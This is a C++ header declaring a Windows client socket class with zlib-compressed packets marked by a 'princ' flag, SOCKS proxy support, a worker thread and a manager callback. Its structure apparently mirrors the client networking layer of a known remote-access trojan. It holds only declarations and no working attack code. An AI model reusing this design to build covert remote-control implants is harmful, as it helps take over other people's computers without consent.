#pragma  once
#include "Buffer.h"
#include <WinSock2.h>
#include <MSWSock.h>
#include <MSTcpIP.h>
#include "zlib.h"
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "zlib.lib")
#include "Manager.h"

// 'p' 'r' 'i' 'n' 'c' | PacketLen | UnZipLen
#define HDR_SIZE	13
#define FLAG_SIZE	5

enum
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};

class CClientSocket{
	friend class CManager;
public:
	BYTE	m_bPacketFlag[FLAG_SIZE];       // 'p' 'r' 'i' 'n' 'c' 
	CBuffer m_CompressionBuffer;			// received compression data
	CBuffer m_DeCompressionBuffer;			// data received without zip
	CBuffer m_WriteBuffer;					// data to send
	CBuffer	m_ResendWriteBuffer;			// resend data

	HANDLE m_hWorkerThread;					// handle to worker thread
	SOCKET m_Socket;						// worker socket
	HANDLE m_hEvent;						// event
	static	int		m_nProxyType;           // no Proxy
	static	UINT	m_nProxyPort;           // Port
	bool m_bIsRunning;						// running signal
	CManager	*m_pManager;                // pointer to manager
public:
	// functions for user
	CClientSocket();
	virtual ~CClientSocket();
	void Disconnect();           
	bool Connect(LPCTSTR lpszHost, UINT nPort);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	void run_event_loop();
	bool IsRunning();
};